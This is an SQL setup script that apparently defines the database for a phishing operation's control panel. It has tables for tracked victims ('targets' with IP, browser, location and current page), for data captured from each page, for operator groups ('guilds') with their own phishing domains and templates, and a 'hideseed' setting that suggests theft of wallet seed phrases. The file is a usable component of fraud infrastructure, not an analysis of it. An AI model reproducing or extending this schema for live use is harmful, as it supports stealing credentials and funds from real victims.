-- Drop tables if they exist
DROP TABLE IF EXISTS captureddata;
DROP TABLE IF EXISTS targets;
DROP TABLE IF EXISTS guilddomains;
DROP TABLE IF EXISTS guildsettings;
DROP TABLE IF EXISTS users;
DROP TABLE IF EXISTS admins;

-- Create tables
CREATE TABLE users (
    username VARCHAR PRIMARY KEY,
    userid VARCHAR NOT NULL,
    password VARCHAR NOT NULL,
    rank VARCHAR NOT NULL,
    guild VARCHAR NOT NULL,
    starting_page VARCHAR DEFAULT 'account_review'
);

CREATE TABLE admins (
    username VARCHAR PRIMARY KEY,
    password VARCHAR NOT NULL,
    guild VARCHAR NOT NULL
);

CREATE TABLE targets (
    id VARCHAR PRIMARY KEY,
    ip VARCHAR NOT NULL,
    status VARCHAR NOT NULL,
    currentpage VARCHAR NOT NULL,
    browser VARCHAR NOT NULL,
    location VARCHAR NOT NULL,
    belongsto VARCHAR NOT NULL
);

CREATE TABLE captureddata (
    targetid VARCHAR NOT NULL,
    page VARCHAR NOT NULL,
    captureddata TEXT NOT NULL,
    FOREIGN KEY (targetid) REFERENCES targets(id) ON DELETE CASCADE
);

CREATE TABLE guilddomains (
    guild VARCHAR NOT NULL,
    url VARCHAR PRIMARY KEY,
    template VARCHAR NOT NULL
);

CREATE TABLE guildsettings (
    guild VARCHAR PRIMARY KEY,
    hideseed BOOLEAN DEFAULT false
);

-- Create indexes
CREATE INDEX idx_targets_belongsto ON targets(belongsto);
CREATE INDEX idx_captureddata_targetid ON captureddata(targetid);
CREATE INDEX idx_guilddomains_guild ON guilddomains(guild);